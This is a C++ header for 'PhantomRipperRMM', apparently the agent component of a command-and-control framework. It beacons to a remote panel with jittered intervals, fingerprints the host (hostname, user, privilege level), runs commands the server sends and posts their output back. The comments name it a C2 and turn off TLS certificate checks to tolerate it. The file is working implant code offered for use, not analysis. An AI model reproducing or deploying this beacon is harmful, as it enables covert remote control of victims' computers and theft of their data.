// PhantomRipperRMM — C++ agent beacon bridge.
// Drop-in WinHTTP client implementing the panel's beacon/response protocol.
// Include from PhantomRMM's agent main and call pr_beacon::run().

#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <cstdint>
#include <cstdio>
#include <random>
#include <chrono>
#include <thread>

#pragma comment(lib, "winhttp.lib")

namespace pr_beacon {

struct Config {
    std::wstring host      = L"127.0.0.1";
    uint16_t     port      = 8443;
    bool         tls       = true;
    std::wstring sessionId = L"";
    uint32_t     beaconSecs = 5;
    double       jitter    = 0.2;
};

// ---- minimal JSON helpers (avoid external deps) ---------------------------

inline std::string jsonEscape(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 8);
    for (char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:
                if (static_cast<unsigned char>(c) < 0x20) {
                    char buf[8]; std::snprintf(buf, sizeof(buf), "\\u%04x", c);
                    out += buf;
                } else {
                    out += c;
                }
        }
    }
    return out;
}

// Extract the value of a top-level "key": "value" string, or "command": null.
inline std::string jsonString(const std::string& body, const std::string& key) {
    std::string needle = "\"" + key + "\"";
    size_t p = body.find(needle);
    if (p == std::string::npos) return "";
    p = body.find(':', p + needle.size());
    if (p == std::string::npos) return "";
    ++p;
    while (p < body.size() && isspace((unsigned char)body[p])) ++p;
    if (p >= body.size()) return "";
    if (body.compare(p, 4, "null") == 0) return "";
    if (body[p] != '"') return "";
    ++p;
    std::string out;
    while (p < body.size() && body[p] != '"') {
        if (body[p] == '\\' && p + 1 < body.size()) {
            char n = body[p + 1];
            if (n == 'n') out += '\n';
            else if (n == 'r') out += '\r';
            else if (n == 't') out += '\t';
            else out += n;
            p += 2;
        } else {
            out += body[p++];
        }
    }
    return out;
}

// ---- HTTP POST via WinHTTP ------------------------------------------------

inline bool httpPost(const Config& cfg, const std::wstring& path,
                     const std::string& body, std::string& response) {
    HINTERNET hSession = WinHttpOpen(L"PhantomRipper/0.1",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, cfg.host.c_str(), cfg.port, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    DWORD flags = cfg.tls ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(),
                                            nullptr, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    // Self-signed C2 tolerance.
    DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                     SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));

    const wchar_t* headers = L"Content-Type: application/json\r\n";
    BOOL ok = WinHttpSendRequest(hRequest, headers, (DWORD)-1L,
                                 (LPVOID)body.data(), (DWORD)body.size(),
                                 (DWORD)body.size(), 0);
    if (ok) ok = WinHttpReceiveResponse(hRequest, nullptr);

    if (ok) {
        DWORD avail = 0, read = 0;
        do {
            avail = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &avail) || avail == 0) break;
            std::vector<char> buf(avail + 1, 0);
            if (!WinHttpReadData(hRequest, buf.data(), avail, &read)) break;
            response.append(buf.data(), read);
        } while (avail > 0);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return ok != FALSE;
}

// ---- host fingerprint -----------------------------------------------------

inline std::string collectInfoJson(const Config& cfg) {
    char host[256] = {0}, user[256] = {0};
    DWORD sz = sizeof(host);
    GetComputerNameA(host, &sz);
    sz = sizeof(user);
    GetUserNameA(user, &sz);

    SYSTEM_INFO si{}; GetNativeSystemInfo(&si);
    const char* arch =
        (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) ? "x86_64" :
        (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) ? "x86" : "unknown";

    BOOL admin = FALSE;
    HANDLE token = nullptr;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elev{};
        DWORD ret = 0;
        if (GetTokenInformation(token, TokenElevation, &elev, sizeof(elev), &ret))
            admin = elev.TokenIsElevated;
        CloseHandle(token);
    }

    char sidUtf8[64] = {0};
    WideCharToMultiByte(CP_UTF8, 0, cfg.sessionId.c_str(), -1, sidUtf8, sizeof(sidUtf8), nullptr, nullptr);

    std::string json = "{";
    json += "\"session_id\":\"" + std::string(sidUtf8) + "\",";
    json += "\"info\":{";
    json += "\"hostname\":\"" + jsonEscape(host) + "\",";
    json += "\"username\":\"" + jsonEscape(user) + "\",";
    json += "\"os\":\"Windows\",";
    json += "\"arch\":\"" + std::string(arch) + "\",";
    json += "\"pid\":" + std::to_string(GetCurrentProcessId()) + ",";
    json += "\"privilege\":\"" + std::string(admin ? "admin" : "user") + "\",";
    json += "\"agent_type\":\"cpp\"";
    json += "}}";
    return json;
}

// ---- main loop ------------------------------------------------------------
// `dispatch` receives each command and returns the output string.
// Built-in task handlers (pr_tasks.hpp) run first when included; the host
// dispatch is the fallback. Structured tasks carry a task_id that is echoed
// back so the panel correlates results.
// Return "__TERMINATE__" handling is automatic.

template <typename DispatchFn>
inline void run(const Config& cfg, DispatchFn dispatch) {
    std::mt19937 rng((uint32_t)std::chrono::steady_clock::now().time_since_epoch().count());
    std::uniform_real_distribution<double> dist(-cfg.jitter, cfg.jitter);

    const std::string info = collectInfoJson(cfg);

    for (;;) {
        std::string resp;
        if (httpPost(cfg, L"/api/beacon", info, resp)) {
            std::string taskId = jsonString(resp, "task_id");
            std::string verb = jsonString(resp, "verb");
            std::string command = jsonString(resp, "command");

            std::string output;
            bool handled = false;

            if (!taskId.empty() && !verb.empty()) {
                // Structured task — built-ins first, host dispatch fallback.
                std::string args = jsonString(resp, "args");
#ifdef PR_HAS_TASKS
                output = pr_tasks::handle(verb, args);
                if (output.empty()) output = dispatch(verb + (args.empty() ? "" : " " + args));
#else
                output = dispatch(verb + (args.empty() ? "" : " " + args));
#endif
                handled = true;
            } else if (!command.empty() && command != "__TERMINATE__") {
#ifdef PR_HAS_TASKS
                output = pr_tasks::handle(command, "");
                if (output.empty()) output = dispatch(command);
#else
                output = dispatch(command);
#endif
                handled = true;
            }

            if (command == "__TERMINATE__") break;

            if (handled) {
                std::string body = "{";
                body += "\"session_id\":\"" + jsonEscape(cfg.sessionId) + "\",";
                body += "\"command\":\"" + jsonEscape(command.empty() ? verb : command) + "\",";
                if (!taskId.empty()) body += "\"task_id\":\"" + jsonEscape(taskId) + "\",";
                body += "\"output\":\"" + jsonEscape(output) + "\"}";
                std::string ignored;
                httpPost(cfg, L"/api/response", body, ignored);
            }
        }
        double sleepSecs = cfg.beaconSecs * (1.0 + dist(rng));
        if (sleepSecs < 1.0) sleepSecs = 1.0;
        std::this_thread::sleep_for(std::chrono::milliseconds((long long)(sleepSecs * 1000)));
    }
}

} // namespace pr_beacon
